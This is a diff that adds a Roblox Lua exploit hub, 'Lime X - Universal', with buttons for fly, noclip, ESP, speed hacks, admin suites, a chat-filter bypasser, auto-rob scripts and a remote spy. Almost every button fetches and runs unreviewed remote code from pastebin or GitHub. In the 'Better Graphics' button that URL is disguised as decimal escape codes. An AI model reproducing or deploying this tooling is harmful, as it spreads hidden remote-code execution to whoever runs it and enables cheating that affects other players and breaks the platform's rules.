@@ -1,0 +1,524 @@
+
+
+local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+
+local X = Material.Load({
+	Title = "Lime X - Universal",
+	Style = 3,
+	SizeX = 400,
+	SizeY = 400,
+	Theme = "Light",
+	ColorOverrides = {
+		MainFrame = Color3.fromRGB(235,235,235)
+	}
+})
+
+local Y = X.New({
+	Title = "Local Player"
+})
+
+
+
+
+
+
+local A = Y.Button({
+	Text = "Infinite jump",
+	Callback = function()
+	 game:GetService("UserInputService").JumpRequest:connect(function()
+        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")      
+    end)
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Jump as mutch as you like!."
+			})
+		end
+	}
+})
+
+local A = Y.Button({
+	Text = "Fly (E)",
+	Callback = function()
+	   loadstring(game:HttpGet("https://pastebin.com/raw/7rXZ9VNc", true))()
+	   end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Press E to toggle fly on and off."
+			})
+		end
+	}
+})
+
+
+
+local A = Y.Button({
+	Text = "Noclip (R)",
+	Callback = function()
+	    loadstring(game:HttpGet("https://pastebin.com/raw/2pwTjwS4", true))()
+	   end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Press R To toggle Noclip on and off."
+			})
+		end
+	}
+})
+
+local A = Y.Button({
+	Text = "Alt Delete",
+	Callback = function()
+	   	loadstring(game:HttpGet("https://pastebin.com/raw/DThr62Cn", true))()	
+	   end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Hold alt and click where you want to delete."
+			})
+		end
+	}
+})
+
+
+local A = Y.Button({
+	Text = "Ctrl Teleport",
+	Callback = function()
+	   loadstring(game:HttpGet("https://pastebin.com/raw/gp9y2Wht", true))()
+	   end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Hold Ctrl and click where you want to teleport."
+			})
+		end
+	}
+})
+
+
+local A = Y.Slider({
+	Text = "Walkspeed",
+	Callback = function(Value)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
+	end,
+	Min = 16,
+	Max = 400,
+	Def = 300
+})
+ 
+local A = Y.Slider({
+	Text = "JumpPower",
+	Callback = function(Value)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
+	end,
+	Min = 20,
+	Max = 400,
+	Def = 300
+})
+
+
+
+local Z = X.New({
+	Title = "Visual"
+})
+
+local A = Z.Button({
+	Text = "Unnamed esp",
+	Callback = function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/uVH1Z6Pa", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Runs Unnamedesp script."
+			})
+		end
+	}
+})
+
+
+local A = Z.Button({
+	Text = "Better Graphics",
+	Callback = function()
+	_G.BlurSize = 3
+
+_G.ColorCorrectionBrightness = 0.03
+_G.ColorCorrectionContrast = 0.3
+_G.ColorCorrectionSaturation = 0.01
+_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)
+
+_G.SunRaysIntensity = 0.2
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 0.9
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 17
+_G.ExposureCompensation = 0.03
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Runs A Good Graphics script."
+			})
+		end
+	}
+})
+
+
+
+local A = Z.Button({
+	Text = "Less Lag",
+	Callback = function()
+				loadstring(game:HttpGet("https://pastebin.com/raw/gX9mR85X", true))()
+
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Removes Graphics For more Fps."
+			})
+		end
+	}
+})
+
+
+
+
+local Z = X.New({
+	Title = "Developer Tools"
+})
+
+
+local A = Z.Button({
+	Text = "HTTP SPY (ClipBoard)",
+	Callback = function()
+	local old
+old = hookfunction(game.HttpGet, function(self, link, ...)
+    setclipboard(link)
+    return old(self, link, ...)
+end)
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "The Link it will get will be set to your clipboard , Press Windows Key + V to open you're clipboard history"
+			})
+		end
+	}
+})
+ 
+ 
+
+
+local A = Z.Button({
+	Text = "Dark Dex V3",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/PUGPnMEt", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads Dark dex v3."
+			})
+		end
+	}
+})
+
+local A = Z.Button({
+	Text = "Hydroxide Remote spy",
+	Callback = function()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Lime X !";
+	Text = "Might take up to 10 seconds to load. ";
+})
+	
+	
+	local owner = "Upbolt"
+local branch = "revision"
+
+local function webImport(file)
+    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
+end
+
+webImport("init")
+webImport("ui/main")
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads Hydroxide Remote spy."
+			})
+		end
+	}
+})
+
+local Z = X.New({
+	Title = "Universal"
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local A = Z.Button({
+	Text = "Infinite Yield Admin",
+	Callback = function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads IY Admin."
+			})
+		end
+	}
+})
+
+
+
+local A = Z.Button({
+	Text = "CMD X Admin",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/F3JvpCDM",true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads CMD X Admin."
+			})
+		end
+	}
+})
+
+
+
+
+
+
+local A = Z.Button({
+	Text = "Chet Bypasser",
+	Callback = function()
+	print ("yes")
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Runs ChetBypasser script."
+			})
+		end
+	}
+})
+
+
+
+
+local A = Z.Button({
+	Text = "Audio Logger",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/GmbrsEjM", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Logs every sound sutch as Boombox."
+			})
+		end
+	}
+})
+
+
+local A = Z.Button({
+	Text = "Anti Audio ID Steal.",
+	Callback = function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/DsJ170Bz'),true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Prevent people using a audio logger to steal your music ID."
+			})
+		end
+	}
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+local P = X.New({
+	Title = "Game Hub"
+})
+
+
+
+
+local A = P.Button({
+	Text = "Jailbreak Autorob ",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/alohabeach/Main/master/Scripts/JailbreakAutoRob.lua"))()
+
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads a auto rob script made for jailbreak.."
+			})
+		end
+	}
+})
+
+
+
+
+
+
+
+local A = P.Button({
+	Text = "Ragdoll Engine GUI",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/AHX0WFwP", true))()
+end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Loads a ragdoll engine gui.."
+			})
+		end
+	}
+})
+
+
+
+
+
+
+local A = P.Button({
+	Text = "MM2 GUI ",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/KUcw9Mn9", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Press P To toggle mm2 gui."
+			})
+		end
+	}
+})
+
+
+local A = P.Button({
+	Text = "Funky Friday AutoPlayer ",
+	Callback = function()
+	loadstring(game:HttpGet("https://ghostbin.co/paste/7kw3/raw", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "AutoPlays for you!"
+			})
+		end
+	}
+})
+
+
+
+
+
+local C = X.New({
+	Title = "Fe Scripts"
+})
+
+
+local A = C.Button({
+	Text = "Network ownership",
+	Callback = function()
+	game["Run Service"].RenderStepped:connect(function()
+   settings().Physics.AllowSleep = false
+   setsimulationradius(math.huge*math.huge,math.huge*math.huge)
+end)
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "You must run this before using any of the scripts in Fe scripts section.."
+			})
+		end
+	}
+})
+
+
+local A = C.Button({
+	Text = "Fe Penis Script",
+	Callback = function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/Kb0xnjEZ", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "To use this script you need 10 Fedoras equiped.Make sure you also use network ownership!."
+			})
+		end
+	}
+})
+
+local A = C.Button({
+	Text = "Fe Hats",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/4B4fktPS", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "This will make your hats spin. You can use command .orbit (Name) to make them spin near someone els.You can also set the speed by doing .speed (Number). Make sure you also use network ownership!."
+			})
+		end
+	}
+})
+
+
+
+local A = C.Button({
+	Text = "Walk on walls",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/kSabtWXN", true))()
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Lets you walk on any wall,."
+			})
+		end
+	}
+})
